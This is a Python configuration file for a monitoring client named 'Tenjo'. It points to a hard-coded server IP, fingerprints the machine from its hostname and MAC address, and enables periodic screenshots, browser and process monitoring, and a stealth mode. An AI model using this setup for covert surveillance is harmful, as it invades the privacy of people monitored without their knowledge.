# Tenjo Client Configuration for Yayasans-MacBook-Air.local
import os
import uuid
import socket
import platform
from datetime import datetime

class Config:
    # Server Configuration
    SERVER_URL = "http://103.129.149.67"
    API_ENDPOINT = f"{SERVER_URL}/api"

    # Client Identification - Dynamic generation based on hardware
    @staticmethod
    def generate_client_id():
        """Generate unique client ID based on hardware"""
        import hashlib
        
        # Get unique identifiers
        hostname = socket.gethostname()
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                               for elements in range(0,2*6,2)][::-1])
        
        # Create deterministic UUID based on hostname + MAC
        unique_string = f"{hostname}-{mac_address}"
        hash_object = hashlib.md5(unique_string.encode())
        
        # Convert to UUID format
        hex_dig = hash_object.hexdigest()
        client_uuid = f"{hex_dig[:8]}-{hex_dig[8:12]}-{hex_dig[12:16]}-{hex_dig[16:20]}-{hex_dig[20:32]}"
        
        return client_uuid
    
    # Use dynamic client ID generation
    CLIENT_ID = generate_client_id.__func__()
    CLIENT_NAME = socket.gethostname()
    CLIENT_USER = os.getenv('USER', os.getenv('USERNAME', 'unknown'))

    # Monitoring Settings
    SCREENSHOT_INTERVAL = 60  # seconds
    BROWSER_CHECK_INTERVAL = 30  # seconds
    PROCESS_CHECK_INTERVAL = 45  # seconds

    # Features
    SCREENSHOT_ENABLED = True
    BROWSER_MONITORING = True
    PROCESS_MONITORING = True
    STEALTH_MODE = True

    # Paths
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    LOG_DIR = os.path.join(BASE_DIR, "logs")
    DATA_DIR = os.path.join(BASE_DIR, "data")

    # Logging
    LOG_LEVEL = "INFO"
    LOG_FILE = os.path.join(LOG_DIR, f"tenjo_client_{datetime.now().strftime('%Y%m%d')}.log")

    @classmethod
    def init_directories(cls):
        """Create directories if they don't exist"""
        os.makedirs(cls.LOG_DIR, exist_ok=True)
        os.makedirs(cls.DATA_DIR, exist_ok=True)

# Initialize directories
Config.init_directories()
